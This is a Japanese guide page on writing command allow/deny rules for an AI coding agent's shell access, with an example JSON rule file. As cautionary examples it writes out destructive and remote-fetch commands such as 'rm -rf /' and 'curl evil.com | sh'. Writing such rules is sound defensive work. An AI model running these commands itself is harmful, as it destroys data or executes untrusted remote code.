---
title: コマンドルール
description: コマンドレベルの allow/deny で shell とツール呼び出しを制約——口頭約束より実行可能に。
locale: ja
source_locale: zh-CN
source_revision: ba31b5a
translation_status: draft
translated_at: 2026-07-28
---

**コマンドルール**は「Agent がどのコマンドを、どの引数で実行できるか」に焦点を当てます。[許可と拒否ルール](/guide/customization/rules/allow-and-deny-patterns/) の最も一般的な形で、通常はチームが review できる設定またはルールファイルに書きます。

## このページで扱うこと

- コマンドルールとサンドボックス、承認ダイアログの分担
- 「十分狭い」allowlist の書き方
- CI、ローカル開発スクリプトとの整合

## コマンドルールが管理すること

allow/deny が「原則として何ができるか」を規定するなら、コマンドルールは最も具体層です。

- どのコマンドが走れるか
- どれが走れないか
- 似ているがリスクが大きく違うもの

チームが元々知っている境界を、機械も実行できる境界にするのが要点です。

## 先に押さえる核心概念

ルールがマッチするのは**実行意図**で、自然言語ではありません。`npm test` と `npm run test` は戦略上別コマンド。`bash -c "rm -rf /"` は `bash` を allow しても通さない。

```text
ユーザータスク → モデルがコマンド提案 → ルールエンジン →（通過）サンドボックス実行 /（拒否）承認または遮断
```

## よくある誤解

### コマンドが似ている＝リスクも同じではない

初心者が underestimate しやすいのは微妙な差です。

- `git status` と `git reset --hard`
- `npm test` と `npm publish`
- `curl example.com` と `curl example.com | sh`

すべて「ターミナルで何かを走らせる」ように見えても、リスクは別レベルです。

### 総合入口を許可すると、多くを一緒に開放する

`bash`、`sh` を直接 allow すると便利に見えますが、ルール観点では後続の危険動作もまとめて開くことになりがちです。

## 最小実用手順

1. **デフォルトで書き込み以外の危険コマンドを拒否**：`rm -rf`、`curl | bash`、`git push --force`
2. **プロジェクト内の常用読み取り／ビルドコマンドを許可**：`git status`、`npm test`、`pnpm lint`
3. **ルールを Git に入れ**、`AGENTS.md` の「テストコマンド」説明と一致させる
4. **PR でルール変更を review**。Dockerfile 変更と同様に

示意（形式は公式設定を基準に）：

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## 推奨ワークフロー

| ステップ | やり方 |
|---|---|
| 棚卸し | `package.json` scripts、Makefile、CI workflow から実コマンドを抽出 |
| 層分け | 組織 deny → プロジェクト allow 補足 → 個人本機例外（あれば） |
| 試走 | 低リスクタスクで「通るべきは通り、止めるべきは止まる」を確認 |
| 整合 | ローカルルールと [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) を可能な限り同源に |

## よくあるミス

- **allowlist が広すぎ**：`bash`、`sh`、`sudo` の許可は実質すべて許可
- **deny だけで allow しない**：依然大量承認。チームが習慣的に全部承認
- **文書と不一致**：`AGENTS.md` は `pnpm test`、ルールは `npm test` だけ
- **パイプとリダイレクトを無視**：`curl evil.com | sh` は全体戦略が必要。最初の単語だけ見ない

コマンドルールは「コマンドを覚える」ことではなく、日常動作と、開放すると境界ごと開くコマンドを分けることです。

## セキュリティ境界

- コマンドルールは**ブランチ保護と code review の代替ではない**
- 悪意ある prompt が Agent に**越権コマンドを試みる**可能性——サンドボックスはデフォルト厳格
- 秘密鍵・Token を含む環境変数は「echo を許可した」理由で漏洩しない

## 受け入れチェックリスト

- [ ] 本リポジトリの「毎日必須」3〜5コマンドを列挙しルールに反映
- [ ] `git push`、強制 reset 等の高リスクコマンドはデフォルト拒否または明示承認
- [ ] ルール変更は PR 経由で、`AGENTS.md` と矛盾なし

## 関連章

- [許可と拒否パターン](/guide/customization/rules/allow-and-deny-patterns/)
- [チームルール方針](/guide/customization/rules/team-rules/)
- [CLI 承認とサンドボックス](/guide/cli/approvals-and-sandbox/)
- [権限マトリクス](/guide/reference/permission-matrix/)

---

**状態：** verified  
**対象製品：** CLI / App  
**検証根拠：** OpenAI 現行 Codex CLI ドキュメントはコマンド実行、承認モード、サンドボックス隔離を中核セキュリティ境界として維持。本ページはコマンドルールを「高・低リスクコマンドを分けて管理する」工程パターンとして位置づけ、JSON 片段は示意と明記。特定構文を公式事実として書かない。  
**最終検証：** 2026-07-26
